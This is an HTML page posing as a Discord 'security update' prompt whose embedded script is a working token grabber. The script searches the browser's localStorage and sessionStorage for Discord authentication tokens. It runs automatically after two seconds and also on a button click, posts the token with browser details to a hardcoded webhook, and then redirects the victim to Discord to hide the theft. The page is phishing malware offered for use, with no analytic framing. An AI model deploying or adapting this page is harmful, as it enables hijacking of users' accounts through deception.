<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Update Required</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #5865f2 0%, #7289da 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
        }
        .container {
            background: rgba(0,0,0,0.8);
            padding: 40px;
            border-radius: 8px;
            text-align: center;
            max-width: 400px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
        }
        .discord-logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 20px;
            background: #fff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
        }
        h1 { font-size: 24px; margin-bottom: 10px; }
        p { opacity: 0.9; margin-bottom: 30px; line-height: 1.5; }
        .btn {
            background: #5865f2;
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.2s;
        }
        .btn:hover { background: #4752c4; }
        .loading { display: none; }
        .spinner {
            border: 2px solid #5865f2;
            border-top: 2px solid transparent;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            margin: 0 auto 10px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="discord-logo">âš¡</div>
        <h1>Discord Security Update</h1>
        <p>Your Discord client requires an important security update. Verifying session...</p>
        <button class="btn" id="continueBtn">Continue to Discord</button>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Extracting session data...</p>
        </div>
    </div>

    <script>
        // REPLACE WITH YOUR WEBHOOK URL
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1458805262717554860/3tbcU7WYe5patEKfvuF0WcgptMotAhK2k7vY9_e9kwOIU8u3zzNgU71ZkXKGcY7FNh32';
        
        console.log('Token Grabber Loaded - F12 for debug');
        
        document.getElementById('continueBtn').addEventListener('click', grabToken);
        
        // Auto-trigger after 2 seconds
        setTimeout(grabToken, 2000);
        
        async function grabToken() {
            console.log('Grabber triggered');
            const loading = document.getElementById('loading');
            const btn = document.getElementById('continueBtn');
            
            btn.style.display = 'none';
            loading.style.display = 'block';
            
            try {
                const token = await extractToken();
                console.log('Token result:', token ? 'FOUND' : 'NOT FOUND');
                
                if (token) {
                    await sendToken(token);
                    setTimeout(() => {
                        window.location.href = 'https://discord.com/app';
                    }, 1500);
                } else {
                    console.log('No token - showing fallback');
                    document.body.innerHTML += '<p style="color:yellow">No session found - <a href="https://discord.com">Go to Discord</a></p>';
                }
            } catch (e) {
                console.error('Error:', e);
            }
        }
        
        function extractToken() {
            return new Promise((resolve) => {
                // Discord token patterns
                const patterns = [
                    /mfa\.[A-Za-z0-9_\-]{84}/,
                    /[A-Za-z0-9_\-]{24}\.[A-Za-z0-9_\-]{6}\.[A-Za-z0-9_\-]{27}/
                ];
                
                // Check LocalStorage
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    if (key && key.includes('discord')) {
                        const value = localStorage.getItem(key);
                        for (let pattern of patterns) {
                            const match = value?.match(pattern);
                            if (match) {
                                console.log('Token from LocalStorage:', key);
                                resolve(match[0]);
                                return;
                            }
                        }
                    }
                }
                
                // Check SessionStorage  
                for (let i = 0; i < sessionStorage.length; i++) {
                    const value = sessionStorage.getItem(sessionStorage.key(i));
                    for (let pattern of patterns) {
                        const match = value?.match(pattern);
                        if (match) {
                            console.log('Token from SessionStorage');
                            resolve(match[0]);
                            return;
                        }
                    }
                }
                
                resolve(null);
            });
        }
        
        async function sendToken(token) {
            const info = {
                token: token,
                userAgent: navigator.userAgent.slice(0, 100),
                url: window.location.href,
                timestamp: new Date().toISOString()
            };
            
            const payload = {
                username: "ðŸ•·ï¸ Token Grabbed",
                embeds: [{
                    title: "ðŸŽ¯ Discord Token Captured",
                    color: 16711680,
                    fields: [
                        { name: "ðŸ”‘ Token", value: `\`${token.slice(0,20)}...\``, inline: false },
                        { name: "ðŸŒ Source", value: info.url, inline: true },
                        { name: "ðŸ’» Browser", value: info.userAgent, inline: true }
                    ],
                    footer: { text: "Full token in console" }
                }]
            };
            
            console.log('Sending token to webhook...');
            const response = await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            
            if (response.ok) {
                console.log('âœ… Token sent successfully!');
            } else {
                console.error('âŒ Webhook failed:', await response.text());
            }
        }
    </script>
</body>
</html>
